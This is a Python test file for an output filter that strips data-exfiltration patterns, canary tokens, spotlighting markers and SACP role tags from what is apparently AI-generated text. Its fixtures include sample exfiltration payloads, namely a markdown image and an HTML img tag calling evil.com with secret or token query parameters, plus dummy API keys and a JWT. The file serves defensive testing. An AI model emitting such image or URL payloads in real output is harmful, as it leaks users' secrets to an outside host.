"""US4: Exfiltration filtering tests."""

from __future__ import annotations

from src.security.exfiltration import filter_exfiltration


def test_markdown_image_stripped() -> None:
    """Markdown image syntax is removed."""
    text = "Look at this ![img](https://evil.com/steal?d=secret)"
    result, flags = filter_exfiltration(text)
    assert "![img]" not in result
    assert "markdown_image_stripped" in flags


def test_html_src_stripped() -> None:
    """HTML elements with src are removed."""
    text = 'Check <img src="https://evil.com/x.png"> this'
    result, flags = filter_exfiltration(text)
    assert "src=" not in result
    assert "html_src_stripped" in flags


def test_data_url_flagged() -> None:
    """URLs with data parameters are flagged."""
    text = "Visit https://evil.com/api?token=abc123"
    _, flags = filter_exfiltration(text)
    assert "data_url_detected" in flags


def test_api_key_redacted() -> None:
    """API key patterns are replaced with REDACTED."""
    text = "My key is sk-abc123456789012345678901"
    result, flags = filter_exfiltration(text)
    assert "sk-abc" not in result
    assert "[REDACTED]" in result
    assert "credential_redacted" in flags


def test_jwt_redacted() -> None:
    """JWT tokens are replaced with REDACTED."""
    text = "Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"  # gitleaks:allow
    result, flags = filter_exfiltration(text)
    assert "eyJ" not in result
    assert "[REDACTED]" in result


def test_normal_urls_unchanged() -> None:
    """Normal URLs without exfiltration patterns pass through."""
    text = "Check https://example.com/docs for more info"
    result, flags = filter_exfiltration(text)
    assert "example.com" in result
    assert len(flags) == 0


def test_clean_text_unchanged() -> None:
    """Text without any exfiltration patterns is unchanged."""
    text = "A normal discussion about architecture."
    result, flags = filter_exfiltration(text)
    assert result == text
    assert len(flags) == 0


def test_spotlight_markers_stripped() -> None:
    """Spotlighting markers (^hexhex^) are removed from output."""
    text = "^c8f6a3^Hello ^c8f6a3^world"
    result, flags = filter_exfiltration(text)
    assert "^c8f6a3^" not in result
    assert result == "Hello world"
    assert "spotlight_marker_stripped" in flags


def test_sacp_tags_stripped() -> None:
    """SACP context tags are removed from output."""
    text = "<sacp:human>What do you think?</sacp:human>"
    result, flags = filter_exfiltration(text)
    assert "<sacp:" not in result
    assert result == "What do you think?"
    assert "sacp_tag_stripped" in flags


def test_sacp_ai_tags_stripped() -> None:
    """SACP AI tags are also removed."""
    text = "<sacp:ai>I think we should consider...</sacp:ai>"
    result, flags = filter_exfiltration(text)
    assert "<sacp:" not in result
    assert result == "I think we should consider..."


def test_canary_token_stripped_legacy() -> None:
    """Legacy bracket-format canaries are removed from output."""
    text = "Here is my response [Internal: CANARY_a1b2c3d4e5f6] and more text"
    result, flags = filter_exfiltration(text)
    assert "CANARY" not in result
    assert result == "Here is my response  and more text"
    assert "canary_token_stripped" in flags


def test_spotlight_underscore_variant_stripped() -> None:
    """Spotlight markers with underscore suffix are stripped."""
    text = "^35523e_^Hello ^35523e_^world"
    result, flags = filter_exfiltration(text)
    assert "^35523e_^" not in result
    assert result == "Hello world"
    assert "spotlight_marker_stripped" in flags


def test_sacp_at_mention_stripped() -> None:
    """@sacp:ai mention format is stripped from output."""
    text = "As @sacp:ai mentioned, the approach works"
    result, flags = filter_exfiltration(text)
    assert "@sacp:ai" not in result
    assert "sacp_tag_stripped" in flags


def test_sacp_at_mention_human_stripped() -> None:
    """@sacp:human mention format is stripped from output."""
    text = "The @sacp:human asked about performance"
    result, flags = filter_exfiltration(text)
    assert "@sacp:human" not in result
    assert "sacp_tag_stripped" in flags


def test_mixed_markers_all_stripped() -> None:
    """Spotlight markers and SACP tags are stripped in one pass."""
    text = "^9f58a7^<sacp:human>Great point</sacp:human>"
    result, flags = filter_exfiltration(text)
    assert "^9f58a7^" not in result
    assert "<sacp:" not in result
    assert result == "Great point"
